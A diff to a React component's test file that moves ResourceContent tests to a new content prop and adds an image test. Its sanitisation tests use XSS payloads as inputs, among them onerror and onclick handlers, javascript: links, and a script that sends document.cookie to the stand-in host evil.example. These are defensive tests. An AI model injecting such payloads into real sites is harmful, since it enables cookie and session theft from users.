@@ -7,7 +7,7 @@ describe('ResourceContent', () => {
     const { container } = render(
       <ResourceContent
         title="Hello"
-        markdown={'A paragraph with **bold** text.\n\n- one\n- two'}
+        content={{ kind: 'markdown', source: 'A paragraph with **bold** text.\n\n- one\n- two' }}
       />,
     );
 
@@ -18,6 +18,21 @@ describe('ResourceContent', () => {
     expect(container.querySelectorAll('li')).toHaveLength(2);
   });
 
+  it('presents an Image Resource as its name and its image, the name as the text alternative', () => {
+    render(
+      <ResourceContent
+        title={'Harbour\nAt dusk'}
+        content={{ kind: 'image', url: 'https://example.com/h.png' }}
+      />,
+    );
+
+    expect(screen.getByRole('heading', { name: 'Harbour' })).toBeInTheDocument();
+    expect(screen.getByRole('img', { name: 'Harbour' })).toHaveAttribute(
+      'src',
+      'https://example.com/h.png',
+    );
+  });
+
   /**
    * The Title ladder is the Resource front's and nothing else's (ADR 0083). A
    * presented Resource is a different surface with a different frame around it, so
@@ -26,7 +41,12 @@ describe('ResourceContent', () => {
    * would draw its lines run together with a space between them.
    */
   it('heads a presented Resource with the Resource’s name', () => {
-    render(<ResourceContent title={'Auth\nHow a session begins'} markdown="Body." />);
+    render(
+      <ResourceContent
+        title={'Auth\nHow a session begins'}
+        content={{ kind: 'markdown', source: 'Body.' }}
+      />,
+    );
 
     expect(screen.getByRole('heading', { name: 'Auth' })).toBeInTheDocument();
     expect(screen.queryByText(/How a session begins/u)).toBeNull();
@@ -44,7 +64,10 @@ describe('ResourceContent', () => {
   describe('sanitises the HTML it injects', () => {
     it('strips event-handler attributes', () => {
       const { container } = render(
-        <ResourceContent title="T" markdown={'<img src=x onerror="alert(document.domain)">'} />,
+        <ResourceContent
+          title="T"
+          content={{ kind: 'markdown', source: '<img src=x onerror="alert(document.domain)">' }}
+        />,
       );
 
       const img = container.querySelector('img');
@@ -57,7 +80,10 @@ describe('ResourceContent', () => {
 
     it('strips javascript: hrefs while keeping the link', () => {
       const { container } = render(
-        <ResourceContent title="T" markdown="[click](javascript:alert(1))" />,
+        <ResourceContent
+          title="T"
+          content={{ kind: 'markdown', source: '[click](javascript:alert(1))' }}
+        />,
       );
 
       // Assert the anchor survives, not just that the scheme is gone: deleting
@@ -74,10 +100,12 @@ describe('ResourceContent', () => {
       const { container } = render(
         <ResourceContent
           title="T"
-          markdown={
-            '<script>fetch("//evil.example/"+document.cookie)</script>\n\n' +
-            '<iframe src="javascript:alert(1)"></iframe>'
-          }
+          content={{
+            kind: 'markdown',
+            source:
+              '<script>fetch("//evil.example/"+document.cookie)</script>\n\n' +
+              '<iframe src="javascript:alert(1)"></iframe>',
+          }}
         />,
       );
 
@@ -88,7 +116,10 @@ describe('ResourceContent', () => {
 
     it('strips inline handlers on anchors', () => {
       const { container } = render(
-        <ResourceContent title="T" markdown={'<a href="#" onclick="alert(1)">x</a>'} />,
+        <ResourceContent
+          title="T"
+          content={{ kind: 'markdown', source: '<a href="#" onclick="alert(1)">x</a>' }}
+        />,
       );
 
       expect(container.querySelector('a')?.getAttribute('onclick')).toBeNull();
